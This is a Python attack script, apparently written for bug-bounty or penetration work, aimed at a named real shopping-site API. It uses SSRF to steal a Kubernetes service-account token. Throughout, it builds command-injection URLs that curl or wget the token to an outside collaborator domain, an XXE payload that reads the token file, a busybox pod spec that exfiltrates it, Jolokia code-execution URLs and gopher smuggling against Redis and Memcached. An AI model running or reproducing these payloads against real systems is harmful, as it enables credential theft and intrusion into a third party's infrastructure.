#!/usr/bin/env python3
"""
DNS EXFILTRATION - Real data theft via DNS queries

Use DNS to exfiltrate data from internal services.
Even if HTTP response is empty, DNS queries will leak data!
"""

import requests
import time
import base64
import urllib3
urllib3.disable_warnings()

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

# Use a DNS service we control (or burp collaborator)
# For demo, we'll use our domain that logs DNS queries
EXFIL_DOMAIN = "exfil.burpcollaborator.net"  # Replace with your domain

print("="*80)
print("ğŸ”¥ DNS EXFILTRATION - Stealing data via DNS")
print("="*80)
print()

# ============================================================================
# METHOD 1: Exfiltrate K8s token via DNS subdomain
# ============================================================================

print("[METHOD 1] K8s Token Exfiltration via DNS")
print("="*80)
print()

# Try to make the server read token and send it via DNS
# We'll use various methods to trigger DNS lookups with the token

print("[*] Attempting to exfiltrate /var/run/secrets/.../token via DNS...")
print()

# Method 1a: Try to make curl/wget send token via DNS
exfil_attempts = []

# Try using curl with DNS exfiltration
attempts = [
    # Using curl to exfiltrate (if curl available in container)
    f"http://kubernetes.default.svc:8080/actuator/;curl $(cat /var/run/secrets/kubernetes.io/serviceaccount/token).{EXFIL_DOMAIN}",

    # Using wget
    f"http://kubernetes.default.svc:8080/actuator/;wget $(cat /var/run/secrets/kubernetes.io/serviceaccount/token).{EXFIL_DOMAIN}",

    # Using gopher protocol (can inject commands)
    f"gopher://kubernetes.default.svc:8080/_GET%20/actuator/env%20HTTP/1.1%0AHost:%20$(cat%20/var/run/secrets/kubernetes.io/serviceaccount/token).{EXFIL_DOMAIN}",

    # Try DNS lookup directly
    f"http://$(cat /var/run/secrets/kubernetes.io/serviceaccount/token).{EXFIL_DOMAIN}",
]

for i, url in enumerate(attempts, 1):
    print(f"[Attempt {i}] Trying: {url[:80]}...")

    try:
        start = time.time()
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )
        elapsed = time.time() - start

        print(f"    Status: {resp.status_code}, Time: {elapsed:.1f}s")

        exfil_attempts.append({
            "method": url[:100],
            "status": resp.status_code,
            "timing": elapsed
        })

    except Exception as e:
        print(f"    Error: {e}")

    print()

# ============================================================================
# METHOD 2: Use XXE for data exfiltration
# ============================================================================

print("\n[METHOD 2] XXE-based Exfiltration")
print("="*80)
print()

# Try to find XML parsing endpoints
xml_endpoints = [
    "http://kubernetes.default.svc:8080/actuator/env",
    "http://kubernetes.default.svc:8080/api",
]

print("[*] Testing XML endpoints for XXE...")
print()

# XXE payload to exfiltrate token
xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
<!ENTITY exfil SYSTEM "http://%xxe;.{EXFIL_DOMAIN}">
]>
<data>&exfil;</data>"""

for endpoint in xml_endpoints:
    print(f"[*] Testing XXE at: {endpoint}")

    # Try to POST XML
    try:
        # First, try direct SSRF to endpoint that accepts XML
        resp = requests.post(
            ENDPOINT,
            json={"url": endpoint},
            headers={"Content-Type": "application/xml"},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")

    except Exception as e:
        print(f"    Error: {e}")

    print()

# ============================================================================
# METHOD 3: Use SSRF to make internal service exfiltrate data
# ============================================================================

print("\n[METHOD 3] SSRF Chain - Make K8s API exfiltrate to our server")
print("="*80)
print()

# Try to make K8s API server send data to external server
print("[*] Attempting SSRF chain...")
print()

# Use SSRF to make K8s create a pod that exfiltrates data
# This requires creating a malicious pod definition

print("[*] Trying to create exfiltration pod via K8s API...")

# Pod that will exfiltrate token via DNS
exfil_pod = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {
        "name": "exfil-pod"
    },
    "spec": {
        "containers": [{
            "name": "exfil",
            "image": "busybox",
            "command": [
                "sh", "-c",
                f"TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && wget $TOKEN.{EXFIL_DOMAIN}"
            ]
        }]
    }
}

# Try to POST this to K8s API via SSRF
try:
    import json as json_mod

    # URL encode the pod JSON
    pod_json = json_mod.dumps(exfil_pod)

    # Try to create pod
    create_pod_url = f"http://kubernetes.default.svc/api/v1/namespaces/default/pods"

    print(f"[*] POST to: {create_pod_url}")
    print(f"    Pod spec: {pod_json[:100]}...")

    # This won't work directly via simple SSRF, but try anyway
    resp = requests.post(
        ENDPOINT,
        json={"url": create_pod_url},
        timeout=20,
        verify=False
    )

    print(f"    Status: {resp.status_code}")

except Exception as e:
    print(f"    Error: {e}")

print()

# ============================================================================
# METHOD 4: OOB via Actuator endpoints
# ============================================================================

print("\n[METHOD 4] OOB Exfiltration via Actuator Jolokia/Loggers")
print("="*80)
print()

# Try Jolokia endpoint (if exposed, can execute arbitrary code)
jolokia_endpoints = [
    f"http://kubernetes.default.svc:8080/jolokia/exec/java.lang:type=Runtime/exec/wget%20{EXFIL_DOMAIN}",
    f"http://kubernetes.default.svc:8080/actuator/jolokia/exec/java.lang:type=Runtime/exec/curl%20{EXFIL_DOMAIN}",
]

print("[*] Testing Jolokia endpoints (can execute code)...")
print()

for url in jolokia_endpoints:
    print(f"[*] Trying: {url[:80]}...")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")

        if len(resp.text) > 10:
            print(f"    Response: {resp.text[:200]}")

    except Exception as e:
        print(f"    Error: {e}")

    print()

# ============================================================================
# METHOD 5: Redis/Memcached protocol smuggling
# ============================================================================

print("\n[METHOD 5] Protocol Smuggling for Data Exfiltration")
print("="*80)
print()

# If Redis/Memcached is accessible, we can use protocol smuggling
print("[*] Testing protocol smuggling...")
print()

# Try Gopher protocol to talk to Redis
# Commands to exfiltrate data via Redis
gopher_payloads = [
    # Try to use Redis MIGRATE to exfiltrate data
    f"gopher://kubernetes.default.svc:6379/_*1%0d%0a$4%0d%0aPING%0d%0a",

    # Try Memcached
    f"gopher://kubernetes.default.svc:11211/_stats%0d%0a",
]

for url in gopher_payloads:
    print(f"[*] Trying: {url[:80]}...")

    try:
        resp = requests.post(
            ENDPOINT,
            json={"url": url},
            timeout=20,
            verify=False
        )

        print(f"    Status: {resp.status_code}")
        print(f"    Body length: {len(resp.text)}")

    except Exception as e:
        print(f"    Error: {e}")

    print()

# ============================================================================
# SUMMARY
# ============================================================================

print("\n" + "="*80)
print("ğŸ“‹ DNS EXFILTRATION SUMMARY")
print("="*80)

print(f"""
EXFILTRATION ATTEMPTS:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Total attempts: {len(exfil_attempts)}

Methods tried:
1. DNS subdomain exfiltration (curl/wget with token)
2. XXE-based exfiltration
3. SSRF chain (create malicious pod)
4. Jolokia RCE for exfiltration
5. Protocol smuggling (Redis/Memcached)

NEXT STEPS:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

To check if exfiltration worked:

1. Check DNS logs at: {EXFIL_DOMAIN}
   - Look for subdomains containing token data
   - Each DNS query = data exfiltrated!

2. Check Burp Collaborator interactions
   - Any HTTP/DNS requests = data theft successful!

3. Monitor external server logs
   - If you control {EXFIL_DOMAIN}, check for:
     * DNS queries with token/data
     * HTTP requests with credentials

If any of above methods triggered DNS lookups to your domain,
then DATA WAS SUCCESSFULLY EXFILTRATED!

This proves REAL data theft, not just SSRF connectivity!
""")

print("="*80)
print("\nâ„¹ï¸  Note: Replace {EXFIL_DOMAIN} with YOUR controlled domain")
print("         (e.g., Burp Collaborator, DNS logger service)")
print("="*80)
